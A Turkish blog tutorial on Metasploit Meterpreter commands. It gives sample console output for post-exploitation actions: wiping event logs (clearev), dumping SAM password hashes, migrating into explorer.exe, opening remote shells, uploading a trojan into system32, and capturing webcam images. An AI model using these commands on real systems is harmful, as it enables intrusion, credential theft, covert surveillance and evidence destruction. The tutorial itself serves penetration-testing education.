---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-14T12:47:00Z"
excerpt: Bir önceki yazıda, kısaca Meterpreter’in ne olduğunu açıklamıştık. Şimdi
  de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar
  açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik
  bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız.
guid: https://www.siberoloji.com/?p=1149
id: 1149
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: Metasploit İçinde Meterpreter Komutları
url: /tr/metasploit-icinde-meterpreter-komutlari/
---

  Bir önceki yazıda, kısaca Meterpreter’in ne olduğunu açıklamıştık. Şimdi de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="meterpreter-komutları">Meterpreter Komutları 
<!-- /wp:heading -->

 
<h2 class="wp-block-heading" id="help">help</h2>
<!-- /wp:heading -->

  Adından da anlaşılacağı gibi, Meterpreter içinde&nbsp;<code>help</code>&nbsp;komutunu verdiğinizde kullanılabilir komutları listeler ve kısa açıklamaları verir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> help

Core Commands
<strong>=============</strong>

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    channel       Displays information about active channels
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="background">background</h2>
<!-- /wp:heading -->

  <code>background</code>&nbsp;komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar&nbsp;<code>msf &gt;</code>&nbsp;komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için&nbsp;<code>sessions</code>&nbsp;komutundan faydalanabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> background
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> sessions -i 1
<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 1...

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="cat">cat</h2>
<!-- /wp:heading -->

  Linux işletim sistemlerinde&nbsp;<code>cat</code>&nbsp;komutu, bir dosya içeriğini ekrana yazdırmada kullanılır. Meterpreterde de aynı işe yarar. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> cat
Usage: cat file

Example usage:
meterpreter <strong>&gt;</strong> cat edit.txt
What you talkin' about Willis

meterpreter &gt;
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="cd--pwd">cd &gt; pwd</h2>
<!-- /wp:heading -->

  <code>cd</code>&nbsp;komutu ile klasör değişimi yapılır.&nbsp;<code>pwd</code>&nbsp;komutu ile aktif olarak hangi klasörde olduğumuz görülebilir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> pwd
c:\
meterpreter <strong>&gt;</strong> cd c:\windows
meterpreter <strong>&gt;</strong> pwd
c:\windows
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="clearev">clearev</h2>
<!-- /wp:heading -->

  <code>clearev</code>&nbsp;komutu, Clear Evidence yani delilleri temizleme anlamına gelir. Karşı tarafta açılan oturumda oluşturulan&nbsp;<strong>log</strong>&nbsp;dosyalarını temizlemeye çalışır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> clearev
<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 97 records from Application...
<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 415 records from System...
<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 0 records from Security...
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="download">download</h2>
<!-- /wp:heading -->

  Karşı bilgisayardan bir dosya indirmeye yarar. İndirilen dosya, metasploit’i başlatırken yerel sisteminizde hangi klasördeyseniz, oraya kaydedilir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> download c:\\boot.ini
<strong>[</strong><strong>*</strong><strong>]</strong> downloading: c:\boot.ini -&gt; c:\boot.ini
<strong>[</strong><strong>*</strong><strong>]</strong> downloaded : c:\boot.ini -&gt; c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="edit">edit</h2>
<!-- /wp:heading -->

  <code>edit</code>&nbsp;komutu, karşı taraftaki bilgisayarda bulunan bir dosyayı düzenlemek üzere&nbsp;<code>vim</code>&nbsp;editörde açar. Vim Editör kullanımı için&nbsp;<a href="http://www.vim.org/">Vim</a>&nbsp;sayfasına bakabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ls

Listing: C:\Documents and Settings\Administrator\Desktop
<strong>========================================================</strong>

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
.
...snip...
.
100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt

meterpreter <strong>&gt;</strong> edit edit.txt
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="execute">execute</h2>
<!-- /wp:heading -->

  <code>execute</code>&nbsp;komutu, karşı tarafta bir komut çalıştırmanızı sağlar. Dikkat ederseniz, Meterpreter’in kendi komutları çalıştırılmamakta. Karşı tarafın komut istemcisinde bir komut çalıştırılmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> execute -f cmd.exe -i -H
Process 38320 created.
Channel 1 created.
Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="getuid">getuid</h2>
<!-- /wp:heading -->

  Karşı tarafta Meterpreter’in çalıştığı sistemin kullanıcı kimliğini görüntüler. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="hashdump">hashdump</h2>
<!-- /wp:heading -->

  <code>hashdump</code>&nbsp;komutu, karşı taraftaki bilgisayarın SAM veri tabanını ortaya çıkarır. Tabii ki önceki Veri tabanı yazımızda belirttiğimiz gibi Workspace kullanıyorsanız,&nbsp;<code>loot</code>&nbsp;tablosuna kayıt eder. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run post/windows/gather/hashdump 

<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the boot key...
<strong>[</strong><strong>*</strong><strong>]</strong> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the user list and keys...
<strong>[</strong><strong>*</strong><strong>]</strong> Decrypting user keys...
<strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="idletime">idletime</h2>
<!-- /wp:heading -->

  Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapmadığını gösterir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> idletime
User has been idle <strong>for</strong>: 5 hours 26 mins 35 secs
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="ipconfig">ipconfig</h2>
<!-- /wp:heading -->

  Karşı bilgisayarın ağ bilgilerini görüntüler. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0

AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: 00:0c:29:10:f5:15
IP Address  : 192.168.1.104
Netmask     : 255.255.0.0

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="lpwd--lcd">lpwd &gt; lcd</h2>
<!-- /wp:heading -->

  Meterpreter komut satırı açık iken vereceğiniz komutlar karşı taraf bilgisayarda işlem yaparlar. Halbuki biz kendi bilgisayarımızda bulunduğumuz klasörü görmek veya değiştirmek isteyebiliriz. Bu durumda Meterpreter’i geri plana göndermeden&nbsp;<code>lpwd</code>&nbsp;ve&nbsp;<code>lcd</code>&nbsp;komutlarıyla bu işlemi yapabiliriz.&nbsp;<code>lpwd</code>: Yerel bilgisayarda hangi klasörde olduğumuzu gösterir. (local print working directory)&nbsp;<code>lcd</code>: Yerel bilgisayarda istediğimiz klasöre geçmeye yarar. (local call directory) 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> lpwd
/root

meterpreter <strong>&gt;</strong> lcd MSFU
meterpreter <strong>&gt;</strong> lpwd
/root/MSFU

meterpreter <strong>&gt;</strong> lcd /var/www
meterpreter <strong>&gt;</strong> lpwd
/var/www
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="ls">ls 
<!-- /wp:heading -->

  Linux İşletim sistemindeki&nbsp;<code>ls</code>&nbsp;komutuyla aynı işlemi yapar. Bulunulan klasördeki dosya ve klasörleri listeler. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ls

Listing: C:\Documents and Settings\victim
<strong>=========================================</strong>

Mode              Size     Type  Last modified                   Name
----              ----     ----  -------------                   ----
40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
...snip...
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="migrate">migrate 
<!-- /wp:heading -->

  Meterpreter sunucumuz, karşı tarafta svchost.exe dosyasının içinde çalışıyor olabilir. Bunu başka bir programın içine gömülü hale getirmek istediğimizde&nbsp;<code>migrate</code>&nbsp;yani “göç et” komutunu kullanırız. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter &gt; run post/windows/manage/migrate 

[*] Running module against V-MAC-XP
[*] Current server process: svchost.exe (1076)
[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)
meterpreter &gt;
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="ps">ps</h2>
<!-- /wp:heading -->

  Hedef bilgisayarda çalışan tüm işlemleri görüntüler. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps

Process list
<strong>============</strong>

    PID   Name                  Path
    ---   ----                  ----
    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="resource">resource</h2>
<!-- /wp:heading -->

  Karşı bilgisayara bağlandığınızda, yaptığınız işlemlerin bir süre sonra aynı şeyler olduğunu fark edersiniz. Örneğin,&nbsp;<code>ls</code>&nbsp;komutunu ver,&nbsp;<code>cd c:\\Program Files</code>&nbsp;ile programlar klasörüne gir vb. işlemleri hemen her zaman yaparsınız. İşte yerel bilgisayarda bir dosyaya, her satırda bir komut olacak şekilde bu işlemleri kayıt edip karşı tarafta çalıştırabilirsiniz. Bunun gerçekleşmesi için&nbsp;<code>resource</code>&nbsp;komutu kullanılmaktadır. 
 

  Burada dikkat edilmesi gereken konu, resource komutuna ilk vereceğiniz dosya yerele hangi klasördeyseniz (<code>lpwd</code>) orada aranır. İkinci parametre ise karşı tarafta hangi klasörde bulunuyorsanız (pwd) orada çalıştırılır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> resource 
Usage: resource path1 path2Run the commands stored <strong>in </strong>the supplied files.
meterpreter <strong>&gt;</strong>
ARGUMENTS:

path1:		Yerel klasörümüzde bulunan toplu iş dosyamız.
Path2Run:	Komutların çalıştırılacağı karşı klasör

root@kali:~# cat resource.txt
ls
background
root@kali:~#
Running resource command:

meterpreter&gt; <strong>&gt;</strong> resource resource.txt
<strong>[</strong><strong>*</strong><strong>]</strong> Reading /root/resource.txt
<strong>[</strong><strong>*</strong><strong>]</strong> Running ls

Listing: C:\Documents and Settings\Administrator\Desktop
<strong>========================================================</strong>

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk

<strong>[</strong><strong>*</strong><strong>]</strong> Running background

<strong>[</strong><strong>*</strong><strong>]</strong> Backgrounding session 1...
msf  exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="search">search</h2>
<!-- /wp:heading -->

  Karşı sistemde arama yapmamızı sağlar. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> search -f autoexec.bat
Found 1 result...
    c:\AUTOEXEC.BAT
meterpreter <strong>&gt;</strong> search -f sea<strong>*</strong>.bat c:\\xamp\\
Found 1 result...
    c:\\xampp\perl\b<strong>in</strong>\search.bat <strong>(</strong>57035 bytes<strong>)</strong>
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="shell">shell</h2>
<!-- /wp:heading -->

  <code>shell</code>&nbsp;komutu, Meterpreter içinde karşı sistemin Command Prompt satırına girmenizi sağlar. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> shell
Process 39640 created.
Channel 2 created.
Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="upload">upload</h2>
<!-- /wp:heading -->

  Karşı sisteme bir dosya yüklemenizi sağlar. Hedef sistemin dosya gösterim notasyonu dikkate alınmalıdır. Ters tırnaklara dikkat edilmelidir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> upload evil_trojan.exe c:\\windows\\system32
<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : evil_trojan.exe -&gt; c:\windows\system32
<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="webcam_list">webcam_list</h2>
<!-- /wp:heading -->

  Hedef sistemde kullanılabilir durumda olan web kameralarını listeler. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> webcam_list
1: Creative WebCam NX Pro
2: Creative WebCam NX Pro <strong>(</strong>VFW<strong>)</strong>
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="webcam_snap">webcam_snap</h2>
<!-- /wp:heading -->

  Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğunuz klasöre .jpeg formatında kayıt eder. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> webcam_snap -i 1 -v false
<strong>[</strong><strong>*</strong><strong>]</strong> Starting...
<strong>[</strong>+] Got frame
<strong>[</strong><strong>*</strong><strong>]</strong> Stopped
Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->